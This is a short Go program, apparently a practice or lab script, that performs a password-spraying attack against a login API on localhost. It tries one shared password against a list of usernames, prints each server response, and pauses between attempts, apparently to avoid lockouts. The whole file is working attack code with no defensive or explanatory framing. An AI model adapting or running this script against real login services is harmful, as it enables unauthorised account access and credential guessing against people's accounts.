package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"time"
)

func main() {
	PasswordSpray()
}

// Password spray
func PasswordSpray() {
	var usernames []string = []string{"ankithans", "johndoe01"}
	var password = "abc@def"

	for _, username := range usernames {
		response, err := http.Get("http://localhost:6000/api/v1/login?username=" + username + "&password=" + password)
		if err != nil {
			log.Fatal(err)
		}

		responseData, err := ioutil.ReadAll(response.Body)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println(string(responseData))
		time.Sleep(2 * time.Second)
	}

}
